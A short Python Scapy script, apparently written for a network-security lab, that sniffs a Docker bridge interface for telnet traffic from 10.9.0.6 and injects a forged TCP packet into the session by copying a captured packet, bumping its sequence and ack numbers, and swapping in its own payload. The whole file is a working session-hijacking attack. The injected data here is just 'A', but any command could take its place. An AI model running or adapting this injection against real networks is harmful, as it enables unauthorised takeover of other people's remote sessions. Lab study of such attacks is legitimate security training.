#!/usr/bin/env python3
from scapy.all import *
oldid = 0
def spoof_pkt(pkt):
    global oldid
    if pkt[IP].src == '10.9.0.6' and pkt[IP].dport == 23 and pkt[TCP].flags == 'PA' and pkt[IP].id != oldid :
        if pkt[TCP].payload :
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            del(newpkt[TCP].payload)
            oldid = pkt[IP].id
            newpkt[TCP].seq += 1
            newpkt[TCP].ack += 1
            data = 'A'
            ls(newpkt/data)
            send(newpkt/data, verbose=0)

f = 'tcp'
pkt = sniff(iface='br-e7e8aab5b63e', filter=f, prn=spoof_pkt)